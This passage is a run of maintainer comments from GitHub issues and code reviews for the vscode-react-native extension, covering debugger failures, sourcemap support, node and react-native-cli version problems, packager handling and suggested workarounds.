end.\nThanks for letting us know about this.\n. From the linked vscode issue, it seems that updating to a newer or older version of vscode solves the issue. If anyone else hits it, consider trying a beta version from https://code.visualstudio.com/insiders\n. @roura356a and @levito could you please add details about the issue to https://github.com/Microsoft/vscode/issues/10148 if it is the same issue here (extension is installed, but no debugger seems to show up)\n. @Microsoft/cordova-tools Can I get a CR please\n. We hope to release an update soon, but I don't have a specific date sorry.\n. Are you using the currently published version of the extension, or did you build from sources? React-native's sourcemaps use a feature that we didn't initially support, and so we had to make a change to the extension which hasn't yet been published to the vscode marketplace.\n. That may help, although I also see that it worked for you on a windows machine using different versions of vscode and react-native (but presumably still not building our extension yourself).\nWhat version of vscode and react-native are you using there?\n. What version of nodejs do you have on these various machines? We currently don't debug properly if you are using nodejs 6.X, could that be the issue you are hitting?\n. This sounds like the same issue as https://github.com/Microsoft/vscode-react-native/issues/276\nCan you try updating your version of vscode to the insider build, as mentioned there?\n. @tapir: We've tried that and it still seems to only affect some people for some reason.\nCan you please try something for us, to try and narrow down possible causes: Go to C:\\Users\\<username>\\.vscode\\extensions\\vsmobile.vscode-react-native-0.1.5\\ and open the package.json, search for enableBrekapointsFor and replace with enableBreakpointsFor, then restart vscode and see if that has any impact. Either way, please report back to https://github.com/Microsoft/vscode/issues/10148 and we'll see if we can find out anything more.\n. This should be fixed in the current VSCode build. If it is not, please file an issue on https://github.com/microsoft/vscode\n. At what point does it print that message? If anything is printed to the debugging console, can you please include that here.\nCan you also please try creating a simple nodejs project (a hello world will suffice) and verify that you can run that via vscode?\n. Sounds like your vscode installation may be broken in some manner. I would suggest that you try reporting the issue at https://github.com/microsoft/vscode Just like you did!\n. We actually build on top of the node debugger, and so you should be able to specify the same arguments. It will show up with green squiggles since we don't explicitly say that we allow the same arguments, but I believe it should work.\nHowever I also see that in the vscode issue you have found the cause. If that has resolved your issue, then I'll close the issue here as well.\n. What version of nodejs is installed on your machine? This sounds like it may be similar to issue #273.\n. Looks like the issue is the kind of sourcemaps generated, they use sections which we don't support in the currently published version. The latest bits in the repo do work though, so feel free to try that out. The specific fix was https://github.com/Microsoft/vscode-react-native/pull/259 I believe\nNext time we publish it should be fixed and I hope to publish a new version in the near future, but I don't have a timeline sorry.\n. The sourcemaps are built by the react-native packager, and the process involves both babel and webpack if I remember correctly. The sourcemaps that it was producing were correct in this case, but used features that we didn't understand as a debugger. It's also possible that tweaking the settings for babel may let you compile a flat source map, rather than one with several sections (that's the part that we don't handle right) but I haven't looked into that.\n. Thanks for reporting this! That permissions issue is a bit of a pain, I'll have to see if we can change our build system to make sure the extension packages the script with execute permissions.\nRegarding the second error you get there: Do you already have your project open in vscode? The failure indicates that we are trying to set up some interprocess communication and that is failing for some reason.\n. Thanks for letting us know! I think I've also worked out a fix for the permissions issue, it may be as simple as changing an environment var that we set.\n. I believe that I've found the reason that navigating to the stack trace failed. I'll work on a fix, but in the short term you can fix it yourself by going to ~/.vscode/extensions/vsmobile.vscode-react-native-0.1.5/out/extension/openFileAtLocation.js and changing var fullpath = process.argv[2] to var fullpath=proess.argv[3]. We were using the wrong argument there (it's actually the path of the project root) and then stripping a layer off, meaning it would never find the project.\n. Thanks for the detailed investigation, I'll fix the scripts to check for the number of arguments passed and behave appropriatelety.\n. Thanks for the CR @jicongw \n. It looks like this is related to some change in a recent version of react-native. The (fairly outdated now) 0.19.0 sample project we have in the repo works fine, but I do see this issue with 0.31.0 and 0.32.0. We'll have to work out what makes symbolication different when operating on a vscode project, since I believe it is all done in the packager and we don't do anything different there.\n. Hmm, I wonder if this is the cause: https://github.com/facebook/react-native/commit/46e880a3a7bd9c6a9d15b6ad17adfdbc23cdcb24\nMight be to do with the restriction that it starts with http possibly, since we aren't running in chrome and we act as though it is on-disk?\n. Yeah, so hopefully in the next release of react native symbolication should work regardless of whether it is debugging in chrome or in vscode or nucleide.\n. Looks like I might have jumped the gun slightly, I think it hasn't made it into the 0.34 release (at least not their RC branch) but it should be in the release after that I think.\n. Thanks for reporting this. It sounds like your source maps are correctly configured, since you say you can set a breakpoint in your .fsx file and have execution stop, we just display the breakpoint location in the bundle rather than the original source. I suspect that this may be because we don't claim to be able to debug fsx files, but we'll need to investigate further.\n. Can you please explain the problem you have with this a bit more? Are you modifying both the port that the packager runs on and the port that the device expects to communicate with? My thoughts were that if you change the packager to run on another port, such as 8088, you can leave the device as trying to connect to localhost:8081 and the port forwarding will connect the device's localhost:8081 to the dev machine's localhost:8088.\n. Do you have react-native installed in your project? We try to detect whether you have a react native project by running react-native -v as you see in the console there, and it looks like it is failing which we interpret as meaning the project is not a react-native project and so we don't initialize ourselves.\n. That's strange. When I run the command I get this output:\n```\n\nreact-native -v\nreact-native-cli: 0.1.10\nreact-native: 0.32.0\n```\n\nIf I use react-native -V then I just get the 0.32.0 like you say. I wonder if this is a mac/windows difference...\n. What version of react-native-cli do you have installed globally?\n. I think that may be the cause actually: Do you have a global installation of react-native, or react-native-cli? They both create a react-native executable, but they behave differently and only react-native-cli is intended to be a global install.\n. Looks good to me.\n. Investigating this, it looks like we're hitting some unfortunate timing constraints when the extension is being torn down.\nOn windows, when we start the packager via node's spawn we get back a process corresponding to cmd.exe /c react-native start, rather than directly to the node react-native-cli.js start process itself. To make sure that we kill the packager, we try to taskkill /T that process, to kill all its descendant processes, but we do this via exec which is asynchronous and takes some time. For most scenarios this is fine, and the Stop Packager command works. However, during the extension teardown the process hosting the extension is about to be terminated, either when activity stops or within a fairly hard time limit it seems. This leads to the taskkill not always completing, and so the descendant node processes remain. \n. Are you running on windows or mac? Did you restart vscode after updating the extension?\n. This can happen when our extension has not properly activated. Have you opened a folder containing a package.json and does react-native -v run in that folder return a react-native version, or complain of not being in a react-native project directory?\nWhat happens if you hit cmd-shift-p and try to >React Native: Start Packager?\n. @dev-xdyang We have updated the typings we use now as @vladimir-kotikov mentions, so it should be fixed. If you still have problems, feel free to re-open.\n. Do you have Chrome open displaying the react-native debugging page? Or do you have multiple instances of VSCode running trying to debug things?\nDid you start the react-native packager yourself? You could try killing all instances of the react-native packager, close all instances of chrome and VSCode, then try to debug using VSCode.\n. The issue you're hitting there is to do with some internal implementation details of how we integrate the debugger into the rest of the extension. The short of it is, if the folder you have open in VSCode is not detected as a react-native project by us (which we do by checking if react-native -v returns a version for react-native, and I believe that in turn is based on there being a node_modules/react-native installation) then the debugger won't be able to do things like ensure the react-native packager is started. \nCurrently we don't support debugging in a different location to where you have the workspace opened because we base communication between the debugger and the rest of the extension on the path of the project, so if they differ then they won't be able to find each other.\nI'm not sure I fully followed your project structure, but one thing that should work, if it suits your workflow, would be to open 2 different VSCode windows; one in the reactNativeApp folder which you use to launch the debugger, and one in the parent folder or whichever folder you want to edit. Any files which are modified should still be picked up by the packager since that isn't something we do in our extension specifically.\n. What version of vscode are you running? This issue was supposed to be fixed in VSCode 1.5\nIf you are using the latest version of VSCode, could you please report the issue at https://github.com/Microsoft/vscode/issues/10148\n. What version of node do you have installed? It looks like your app is trying to run some JS using es6 syntax which isn't supported prior to node 6.\n. I have just followed the same steps as you initially posted, except with node 6.3.1 installed, and I was successfully able to debug.\nWhen we debug a react-native application we run it in our own environment, which is node for us. If your react-native application uses features that your version of node do not support, that could cause the error message that you report. I suggest upgrading to node 6 and trying to debug again.\n. I also just downgraded to node 5.1.1 and reproduced your issue. I suspect that internal parts of react-native use es6 features and so while \"your\" part of the app (in index.ios.js) may not use any of these features, the app as a whole would. I also suspect that this is a relatively recent change, since I have run older versions of react-native on older versions of node in the past.\nFor now, if you wish to use react-native 0.34, upgrading to node 6 would be the best approach.\n. Does this occur with the basic app you showed above, if you add a console.log line before the return (... of the render function and set the breakpoint on it? There have been issues in the past with how react-native constructs sourcemaps with JSX in them which cause breakpoints to be set in the wrong location.\n. I've just tried to reproduce the issue with vscode 1.5.3, node 6.6.0 and our extension 0.2.0, and I successfully hit the breakpoint set in the render() function. Apart from adding the log statement, have you modified the react-native init project at all?\n. Yeah, looks like this is some kind of breaking change in the next version. We'll have a look and see what's happened. Thanks for bringing this to our attention.\n. I believe that's a bug in node 6, unfortunately. It sounds similar to https://github.com/Microsoft/vscode-react-native/issues/273\nIf that's the case, then there's not a lot we can do unfortunately since node itself seems to be hitting the breakpoint and stopping execution, but not reporting that fact to the debugger which is attached to it. As a workaround, if you manually hit \"pause\" it should show up as stopped at the breakpoint, and then you can continue debugging. Definitely not optimal, but it's something.\n. I've started looking into the issue with vscode insiders 1.6.0, and it looks like the node debugger that we depend on has made some changes in how they handle source maps which break us. We'll have to adapt to deal with that before breakpoints work in the next vscode release.\n. Definitely possible, but we'll have to make sure to refer to this property everywhere, including when we set up interprocess communication from the debugger back to the VSCode extension\n. Yes, I think settings.json is the correct place for this, especially since we cannot allow multiple values specified in different launch.json entries (without a lot of extra effort).\nWe may also need to change the triggers for our extension activating, since if the root does not have a package.json but some subfolder does then currently we won't even try to start.\n. Hmm, the CI failed the build, but it seems unrelated to the contents of the PR. Might be to do with updates to vscode itself perhaps?\n. If you look in the bottom right of the VS Code window, what language service does it show?\n\nAlso have you referenced import { AppRegistry } from 'react-native'; ?\n. Do you have a jsconfig.json or a tsconfig.json file in your root folder, which specifies either a files element or an excludes element? If you do, that may be excluding the .vscode/typings folder which would mean intellisense does not consider them.\n. That shouldn't cause issues then. Could you please check that .vscode/react/typings exists and has react-native.d.ts in it?\n. Apologies for the delay in responding. This scenario is currently somewhat supported if you make some slight changes to your project:\nIf you follow the instructions at https://facebook.github.io/react-native/docs/running-on-device.html (or whatever is appropriate for your version of react-native, it seems to be changing recently) to ensure that the device is looking for a packager running on your windows machine, then from vscode you can start the packager from the command palette (ctrl-p then >React Native: Start Packager) and then run the Attach to packager debug configuration to register as a debugger. Then if you shake the device and start debugging it should connect to the packager that vscode started and begin debugging in vscode, with any JS changes you make effecting your app. Any native changes will require recompiling on a mac though, and the final bundling of everything in a release-mode app will also require a mac. . I'm going to close this since I believe we already support this scenario. If you have any problems, feel free to reopen.. This will be because we pick the first workspace/project that we find. The simplest fix is to clean up the ios folder and remove the older project files.\nPotentially we can also allow you to specify the project name and resolve any ambiguity that way.\n. Oh I think I misread your initial circumstance. Just to be clear: You have a ios/OldMyApp.xcodeproj file, which you modified (via xcode) to build a NewMyApp.app application, is that correct?\nThat will break us unless you rename ios/OldMyApp.xcodeproj to ios/NewMyApp.xcodeproj since we assume the final output is named the same as the xcodeproj. If you rename the xcodeproj, does it work for you?\n. If you open up a command line and type adb, does it find adb or does it complain that it is an unknown command?\nI'm not sure what those non-printable characters there are, but it seems like we are failing to find adb which we use to interact with android. If you ensure that adb is added to your PATH and that vscode gets that PATH then I believe it should work for you.\n. Could you please open a command line and run adb devices and show the response you get?\n. Could you please clarify the scenario where it doesn't work? When you have a network attached device, but not with a network attached emulator or with a physically attached device?\n. I can replicate your error but only if adb devices shows up multiple targets (e.g. multiple emulator instances).\nYou should be able to work around this by explicitly specifying the device you want to connect to in launch.json: add a \"target\": \"192.168.8.8:5555\", property to the \"launch android\" entry, where the value is whatever shows up for your device under adb devices.\n. Looks good to me otherwise.\n. I'll close this for now, but if you try the steps referenced in https://github.com/Microsoft/vscode-react-native/issues/328#issuecomment-259699039 and they don't work, please do re-open the issue or file a new one so we can try to improve the situation.. Can you please try debugging, get to the point where a breakpoint is not hit, and then upload the contents of .vscode/.react/index.<platform>.map somewhere so I can see how it looks?. That's interesting, since our debugger doesn't support inline sourcemaps. I suspect that when using non-inline sourcemaps, the JS compiled from TS is having the source maps ignored rather than rolled into end result, and using inline sourcemaps might be working around that. Definitely needs some more investigation. @vladimir-kotikov are you able to look into that?. I agree, it's something that we often need to ask for so it'd be good to put it in the template\n. Looking at https://github.com/Microsoft/vscode-react-native/blob/75109376576b5a7c0bc586deb91e9804bded3076/src/extension/extensionServer.ts#L95 it seems that we can achieve the stated goal here (always starting a fresh packager) simply by calling startPackager() every time we launch.\nWe had initially avoided that because it increases startup time, but if it's less intuitive then I think putting it in the above location rather than where you have it in this PR might be simpler.\n. Can you please clarify what you mean by \"Unable to open debugger on iOS emulator\"? The debug console output you include above seems to indicate to me that we are connecting to your app and it is running code from it. Does something happen after that?\n. The line Running application \"myproyect\" with appParams: {\"rootTag\":1,\"initialProps\":{}}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF is printed by react-native using console.log, so I would expect your application to work.\nAre you able to share some sample code that reproduces the issue?\n. Does this happen for you even in a trivial application, e.g. adding that snippet to a freshly created react-native init project?\n. Hmm, I'm getting a different issue when I try to test this out myself. We'll have to investigate some more. Thanks for bringing this to our attention!\n. Looks good. We can still behave oddly if a packager is started externally, but we can't do anything about that.\n. Apologies, I missed seeing this report! It's the same as #340.\nI'll close this one in favor of the other since it has specifics on the cause. I'm not sure of a workaround at the moment apart from downgrading to an earlier react-native\n. We are still trying to work out the best way to solve it. The root cause of the issue is a bug in nodejs: Because we (and webstorm) run the react-native application inside a nodejs vm, it's triggering a bug where properties do not get deleted properly which is what leads to the infinite recursion in a getter method.\n. I believe that only a change to react-native 0.36 should be required, but I haven't yet had a chance to test whether node 7.X has the bug that causes this issue.\n. We've just published an update (0.2.3) which has a workaround for this issue. If you update then you should be able to use react-native 0.37\n. @thiyaga123 After you updated our extension to 0.2.3 did you make sure to restart vscode? I've double checked that downloading the published version works for me.\nWhat version of node are you running?\n. Thanks for the workaround @vladimir-kotikov !\n. If you write your react-native code in typescript then you can do this already: the Component class from react is actually Component<P, S> which accepts template parameters for the props and state types, so you can write class MyClass extends Component<PropsType, StateType> {... and get the intellisense support.\nI'm not sure whether we can provide the same access in a plain JS project.\n. I just spoke with some of the typescript team, and I have a partial solution for you, and they have some ideas for improvements later on.\nFor now, here's what I suggest:\n1.  Define your props/state types somewhere, e.g. typings/react-native.d.ts. Make sure that this location is referenced by the tsconfig.json or jsconfig.json at the root of your project (By default any .d.ts files under the root and not in a dot-folder should be included).\n    *  For example, I might define interface IProps {foo: string} and interface IState { bar: number} in typings/react-native.d.ts.\n2. In your js file where you define a new component, add the generic definition like so:\n  export default class testapp extends Component<IProps, IState> {\n3. You should now have intellisense on this.props and this.state within that class:\n\nYou may get errors pointing at the Component<Props, State> in future since it isn't legal JS, but the default react-native babel configuration includes removing flow types, and this syntax is common between flow and typescript so it will be removed as part of compilation.\nIn future, the typescript language service may support additional JSDoc features which would let you specify a JSDoc comment to provide the generic parameters rather than using the TS syntax directly in the code.\nDoes this match what you were looking for?. We clean up the contents of .vscode/.react when you quit vscode, so if you haven't attempted to run your app since you opened vscode you will need to do so.\nAfter you've run your app once, you should see something like .vscode/.react/index.android.bundle. If you want finer control over typings, you can specify that in a tsconfig.json or jsconfig.json file. We create one by default which specifies \"exclude\":[\"node_modules\"]. If you want to ignore all our typings, then add \".vscode\",\"typings/react-native.d.ts\" to that list and it should exclude the components which we add in. Alternately you can replace it with an \"include\":[] list which references only your source files and hand-selected typings files.\n. @panarasi what are your thoughts?\nI feel that it would be better as opt-out, so it provides intellisense automatically via typings by default, but users could add a setting in settings.json to disable the feature if they want fine grained control over typings.\n. This should be fixed in newer versions of vscode by #357 . I hadn't noticed that vscode had support for CHANGELOG.md, we should definitely add that. Thanks for pointing this out!\n. I've added a changelog that should show up in our next release. For now, the current and next release's changes can be viewed at https://github.com/Microsoft/vscode-react-native/blob/master/CHANGELOG.md\n. If you do get a chance to look into it further, please feel free to re-open this issue with more information.. What is the end-result of this fix? Will it just ignore the sourcemap but continue debugging (with no breakpoints working) rather than throwing an error and stopping the app entirely?. Unfortunately this looks a lot like a bug in nodejs (specifically in v8 actually): https://bugs.chromium.org/p/v8/issues/detail?id=3270\nI also just tried this out in node 6.9.1 and hit what looks like the same issue. Until node/v8 addresses this issue, we won't be able to debug in places where the debugger would inspect a proxy.. The other node debugging extension that you link to there is using an alternative (and currently experimental) way of debugging node.js which is using the same debugging protocol that Chrome uses. I just tested it out and int does look like this particular issue goes away if we were to use the newer debugger under the hood.\nThat said, the new debugging approach is experimental and subject to change, and it'll take us a bit to move our infrastructure from the current debugger to the new one if we do decide to go that way. We'll have to discuss it and see if there's an alternative approach. Thanks for bringing it to our attention though!. I didn't test using the debug adapters, I tested the underlying debugging mechanism. It isn't simple to switch the react-native debugging pipeline that we have to one which uses the new debugger protocol, so I can't provide a workaround for now unfortunately.. My test was simpler than you think unfortunately: If you create a JS file with contents\nvar p1 = new Proxy([], {});\nsetTimeout(function () {\n  var p = new Proxy([], {});\n  debugger;\n}, 100000);\nThat is enough to show off this particular bug. If you run node debug test.js and step over that first line, go to the repl, then try to print out p1, it'll trigger the bug and crash node. If you use the new debugging method via launching node as node --inspect test.js then navigate chrome to the URL it tells you (hence the timeout to give me a chance to attach) then it can view both variables just fine.\nHowever, to move our debugger on top of the node2 debugger rather than the node debugger will need some investigation into how the new debugger works, make sure that we pass in the required arguments correctly and also ensure that the changes we make for source maps get converted to work with the new, differently structured debugger. That's all work that I haven't looked into yet.. Can you please clarify what you mean?\nDo you want to just run your app in the android emulator and not debug it? If so, then currently we don't provide a way to launch-without-debugging, but it's something that we could add. What you can do, however, is disable JS debugging after the app is launched using the developer menu. You need to either trigger a shake, or something like adb shell input keyevent 82 to bring it up.. I'm closing this issue because it isn't clear what you mean. Feel free to reopen with a clarification.. Thanks @alsorokin!. I've just published a version 0.2.4 which should have these fixes now. If you still face issues, please let us know!. What kind of project is this? It doesn't look like a react-native project to me. What are you trying to do?. Looks like you are debugging an iOS app; are you trying to debug against the iOS simulator or an iOS device?. This looks like it's a regression in realm-js caused by changes in react-native. They change behavior depending on the environment that they detect, and one check that the current release does is whether typeof window != 'undefined'. This is trying to detect running in chrome, but recent react-native releases actually define window as an alias for the global object, which confuses it and ends up causing your issue.\nIt looks like their master branch on github attempts to fix this by checking for a node-like environment first,  but that also includes a check for (''+process) == '[object process]' and that didn't seem to work in our environment. I'd suggest that you open an issue on realm-js and reference this issue, and we might need to coordinate to make sure that the detection works properly.. On that last point there; we sandbox the app and try not to expose much of the environment (to avoid scenarios where things work under testing but not on an actual app) and that includes not passing in the process object, and then react-native later on constructs a default process object. If realm needs it, we could potentially pass in the process object to the sandbox.. If your workspace is not detected as a react-native project, then that would cause this error. We require a communication channel between the debugger and the extension process, and if we don't think we are in a react-native project then we don't set up that communication channel.\nWhen you open your project, do you see a .vscode/.react folder and a .vscode/launchReactNative.js file created in your project? If not, that suggests that we don't believe you are in a react-native project and you'll run into this issue.\nCould you please go to the root of your project on the command line and run react-native -v and let us know what the result is? We run that command and expect to get back something like react-native: 0.39.2 to indicate that we are within a react-native project.. Note that there's currently a bug where if you open an individual file rather than a folder, we'll throw errors when trying to start our extension, but the intended behavior in that case is to simply not activate since we require a workspace.. Looks like you're right: my react-native-cli version is 1.0.0 and it works as I expect, while if I use react-native-cli@2.0.0 it fails in the way that you specify. In the short term, if you npm install -g react-native-cli@1.0.0 then our extension should work, but I don't know what they've changed in react-native-cli between 1.0.0 and 2.0.0. Looks like it should:\n$ react-native -v\nreact-native-cli: 1.2.0\nreact-native: 0.39.2. There should also be a new release react-native-cli@2.0.1 which also works as well now.. Using npm should be fine; as long as you can react-native -v to get the output you showed then it should be sufficient. When you open the project in vscode, do you see it create a .vscode/.react folder? . That suggests that our extension is not activating then. Are you opening a folder, not an individual file, and does that folder contain the package.json of a react-native project?. Can you please go to \"Help -> Toggle developer tools\" in vscode, and see if the console shows any errors/messages?. On the machine that is giving the error, can you check whether your global install is of react-native, or react-native-cli? I believe that if you accidentally globally install react-native then it responds to -V as you mention.. @ruimgoncalves can you please open a node command prompt, navigate to your project folder, open an interactive node session, and try running\nvar p = child_process.spawn(\"react-native.cmd\", [\"-v\"]);\np.stdout.on(\"data\", function (data) { console.log(\"Output: \" + data.toString());})\np.on(\"error\", function (err) { console.log(\"ERROR\"); console.log(err);})\nHopefully that can give a more specific reason for why we can't run the command for you.. Hah, did not expect that. Glad you've got that sorted out now :). I still suspect that it is the same issue, which we've reported at https://github.com/nodejs/node/issues/8347\nNode is currently going through a change of how debugging works. Unfortunately for us, the new system (which I believe works in this case) is still experimental and changing, while the old system is essentially deprecated and doesn't seem likely to have much more done on it. . That error indicates that we encountered some error (looks like passing null or undefined to a path.foo function probably) when we attempted to fetch and execute the application script from the packager.\nDo you get this error if you try and run a freshly created default react-native app?. Could you please go to ~/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/out/debugger/appWorker.js and look for the line \nprintDebuggingError(\"Couldn't import script at <\" + url + \">\", reason);\nJust after that, add the line\nlog_1.Log.logWarning(reason.stack);\nthen try your scenario again. That should show exactly where the error is coming from, and will help track down the cause.. Sorry, I meant to say log_1.Log.logWarning(reason.stack);. See my correction above, I specified the wrong variable.. It looks like something in your bundle (that is, your app) is calling require(something); which we are passing over to node's require() and that is complaining. I haven't seen this happen before, I'll have to look closer.. I just tried this out and I don't seem to get the same problem. I also find that my index.android.bundle isn't as long as yours seems to be. Is the above error from the freshly created project, or one that you've modified?\nEither way, I do have a require(550) in around that position which seems like it is plausibly causing your issue, but for me I have some code around line 52 in the bundle which sets global.require=_require; to override the require that we pass in. Do you have something similar to that?. Ah, this may be due to the version of node; require is overriden on global but global is passed in and may not actually be global.... One thing you can try in the short term: Go back to ~/.vscode/extensions/vsmobile.vscode-react-native-0.2.4/out/debugger/appWorker.js and look for the line require: function (filePath) { return scriptToRunModule.require(filePath); }, and comment it out. That will no longer expose a native node require to the app, and will avoid this specific error. However, if react-native is failing to set up its own require function, that will mean that the require will fail for another reason.. Have you tried the fix above? If that did not work, are you getting the same error, including when you print the stack trace?. If you have tried the suggested fix above and it has not helped, them I'm not sure what the cause is. I have isolated the specific cause of the initial error here, and it is a difference in behavior between node 6 and node 7 (specifically in node 6 the react-native code is able to replace the 'global' require function with one from require.js, while in node 7 the same code does not).\nI'm putting together a fix for the initial issue, but I'll need the stack trace of your issue @miho7032 @miho7031 to see what is going on there.. This should be fixed in the version that I just published.. How are you compiling your typescript? And have you made sure to specify a custom transformer as mentioned at http://www.reactnative.tools/tutorials/2016/09/20/reactnative-ts to make sure that the sourcemaps are carried along with the rest of the bundling process?. We use the typescript language service to provide intellisense / autocomplete by default (and you can also install the flow extension and use flow for intellisense) and I don't think they support this for 'free', but you could explicitly provide typescript typings for the infra/FetchData module and then if you reference that elsewhere in your project it should use those typings for autocomplete.. The .vscode/.react folder should be created by our extension if we believe the project is a react-native project, and if we don't believe the project is a react-native project then debugging will fail for several other reasons.\nOne thing that causes us to not believe a project is a react-native project would be if there is no node_modules/react-native/package.json at the root of the workspace, and that will be the case if you have just checked out a new repo. Does this still happen for you if you npm install before opening the workspace in vscode?. It is our intention that you can gitignore the whole .vscode folder with no detriment to the project.. We should be creating the .react folder when our extension activates shortly after you open the workspace, using the code at https://github.com/Microsoft/vscode-react-native/blob/master/src/extension/rn-extension.ts#L73\nThat code is triggered if we believe it is a react-native project, just after we set up the debugging stub entry point. If you delete .vscode/launchReactNative.js and re-open your project, does that get re-created? And if so, is the .vscode/.react folder still missing?. Unfortunately I'm not sure we can create the folder as we start the debugger, since I believe the \"it doesn't exist\" error is happening before it runs our code in the debugger, but that's something worth looking into. Ideally if nothing external is changing the .vscode folder then our extension should manage the lifetime of the .react folder appropriately and not cause issues, so if you can find a scenario that reliably runs into the issue I'd definitely like to hear it so we can try and improve.. Thanks for your contribution!. Can you please clarify: Do you mean that you wrote the code in the second snippet, but when you saved it was converted to the first? Or you wrote the first and expected save to fix the formatting?. We've published the version of our extension which has support for variants now, so I'm going to close this issue. If you have further problems, feel free to reopen or create a new issue with relevant details.. Does the same thing happen for you if you react-native run-ios on the command line?. Can you please try launching to iOS with our extension, then when it fails go to the command line and run curl 'http://localhost:8081/index.ios.bundle?platform=ios&dev=true&minify=false' > bundle.js, and finally try running node bundle.js and see whether that throws an error.\nThe error above indicates that the compiled JS bundle has some kind of parse error in it, but I'm not sure why that would happen only for us and not when running via the command line. If you can reproduce the error in node it might point to the line, and if you could post the section in the bundle it complains about we might be able to work out what's going wrong.. Looks good to me.. Looks like there's a few linting errors. Apart from that it looks good to me!. On the whole this looks pretty good to me. Am I correct that the SingleLifetimeAppWorker is no longer used at all, and is replaced by the forking app worker?. Looks like one of our tests is failing now, but it seems to be specifically to do with the single lifetime worker which isn't as relevant any more. Could you please look into that and update or remove the test as appropriate?. Also to answer your question about the single lifetime worker: I think it would be best to only have the one way of doing things, so I am inclined to remove the single lifetime worker and just focus on the forked worker.. Just a couple of questions, looking good.. Looks great, thanks @vladimir-kotikov!. Looks like it works great, thanks!. @vladimir-kotikov do you have any ideas what might be causing this? Looks like the new debug adapter is having trouble setting breakpoints in the child process?. I suspect that this is because we restart the child process early on, so the adapter tries to set breakpoints in the process, the process is terminated (and a new one started), and the initial breakpoint function times out.. Looks like one of the tests failed, but the only change to the code is my merging another branch which had tests passing in it. I think this might be the same one that was being flaky earlier?. This may be a result of the compilation from your original source to the bundle. Could you please open up .vscode/.react/index.android.bundle and search for your code? I suspect that the line const counter = this.state.counter + 1; is actually being compiled to something like var counter = _this.state.counter + 1;, where this is replaced by _this. If so, then you would be able to access _this.state.counter but not this.state.counter in the debugger. In fact, if you expand the Closure entries in the variables panel, you may even find the _this in there. \nUnfortunately there isn't much that we can do about this behavior since there isn't  any mapping from your source-code variables to the compiled-code variables.. I do that in the package.json verson which is what gets dropped into the end user's project. This one is only for us developing the project, and it seems to work fine at the moment.\n. I vote no, and that we keep this as trivial as possible.\n. Ah, missed that one. I had fixed all the source files, but missed this one\n. We do not.\n. In general, they specify the kinds of files that you are allowed to add breakpoints to. In this specific case they will be ignored because we never actually run a debugger of type \"reactnative\" so it is just suggestive.\n. I agree. I think that we should use import * as foo from 'bar';, or better yet import {Foo} from 'bar';, I just haven't had a chance to go through and make everything uniform yet.\n. The user-visible name is specified by a \"label\" option that I missed adding here; this name is what must be specified in the launch.json \"type\" field (and in our case, must currently never be used)\n. Removing them will have no impact on us at the moment, so we can. I like them here as a form of documentation of intent though, personally.\n. Doesn't require any changes right now, so I'm happy to do this and keep it that way yeah.\n. No, I forgot to remove the dependencies of the debugger side of things when I removed the code.\n. Done\n. I prefer automatic versioning so we don't end up accidentally forgetting to bump a version, and when we do make a breaking change we can use semver ranges to distinguish what kind of file it claims to be.\n. Why change this? Is there a reason you want to not run tslint concurrently with the build?\n. I suggest using backticks for interpolation here\n. This is returning Q().done() which I think is a bit misleading since you might think that it is returning a promise rather than void. I'd either change the .done to just an error handler, or remove the return.\n. I think we should include a limit on how many times this retries, and we could actually convert it to be promisy.\nPerhaps using a utility method like\n```\nprivate static retryAsync(func: () => Q.Promise, condition: (result: T) => boolean, maxRetries: number, iteration: number, delay: number, failure: string): Q.Promise {\n        return func().then(result => {\n            if (condition(result)) {\n                return result;\n            }\n        if (iteration < maxRetries) {\n            return Q.delay(delay).then(() => CordovaDebugAdapter.retryAsync(func, condition, maxRetries, iteration + 1, delay, failure));\n        }\n\n        throw new Error(failure);\n    });\n}\n\n```\nfrom vscode-cordova\n. I'd say print an error informing the user how to specify the launch.json with a platform, and exit.\n. These two blocks can be combined into one since the first one doesn't return a promise.\n. I believe that this is correct in a strict sense, but I'd suggest some changes based on experience: If a sourceMappingUrl comment does not start at the beginning of a line, it is still picked up by chrome, so we need to make sure to remove it. I would also suggest stripping out all sourceMappingURLs and then adding our own at the end of the file.\nHowever this approach may result in more edge cases / complexity as well, since what would happen if there was a string literal referring to source maps? I'm not suggesting we should add a full JS parser just to deal with this, but I do think we should carefully consider the circumstances where we work and where we break.\n. I would appreciate some more comments here to document what is intended, since I think there are some subtleties here.\nFrom what I understand, this is assuming that the sourcemap is being placed in this.bundleFolderPath, and making all sources relative to that location by making sourceMap.sourceRoot = \"\". What format do we assume the sources arrive in? It seems we expect raw paths, rather than file:// paths?\n. Rather than string concatenation, we can use the url package here. Something like \nlet sourceMapUrl = url.parse(this.sourceMapRelativeURl(scriptBody);\nsourceMapUrl.protocol = scriptUrl.protocol;\nsourceMapUrl.host = scriptUrl.host;\nThat will just substitute the particular components out in a more principled way.\n. That's fine, the reason makes sense.\n. I have in fact seen this happen \"in the wild\". An unmodified ionic v2 project produces an app.bundle.js with a bunch of sourcemap comments in it, one of which doesn't start at the beginning of the line, and chrome is happy to pick the first one it encounters and use that as the sourcemap. Even if there was one at the end of the file which actually existed, it seemed to pick the first one it found.\n. Should this only be called once? If it can happen multiple times then we need to be careful about attaching too many event listeners.\n. Is this class intended to be used only in the context of debugging, or also potentially from the in-process extension code? If it is debug only, I might suggest moving it under the debugger sources to avoid possible mistakes. If it is both, might need some conditional logic to detect the environment.\n. In that case, I think the commented out code for using vscode apis which are inaccessible to the debug adapter side of things should be re-enabled when called from within vscode so we get nice windowed output.\n. Actually right now request is used in the debugger code, so it is a real dependency and should be in the dependencies. Same with websocket. As for being able to remove it, I believe we can. We just use it to talk to the packager, and we don't need much complexity there.\n. In vscode-cordova we use the ws package for websockets, perhaps we should also use that here.\n. We need a mechanism to pass the project directory to the platform, preferably here when it is first created.\n. Perhaps we should change this to a more general parseArguments function which works out the public interface. E.g. we might also want a device/emulator parameter.\n. If the packager can typically take such a long time to start, I would suggest fewer attempts with a longer delay, and include some messaging to the user to let them know that things are happening. Maybe 5 attempts with a 5s delay?\n. Sure, but that's not what I was worrying about. I think that we should inform the user that the machine isn't hung for a minute, but that we are waiting for something to happen. If we do that once a second for a minute, that sounds quite annoying to me.\n. These commands now have a \"subject\" parameter which is unused.\n. This should be \"end\" rather than \"close\". The close event is fired when all IO streams are closed, but if it is sharing stdin/stdout/stderr with the parent, that's not going to happen. The end event fires when the process terminates which is what we are after here.\n. That also works fine yeah. I've been building a list of things we need to pass down the stack. So far we need at least the following:\n- Project root\n- Simulator / real device\n- Optionally which simulator to target\nI think it would be a good idea to define a IRunOptions interface and pass that down, that way we can extend it 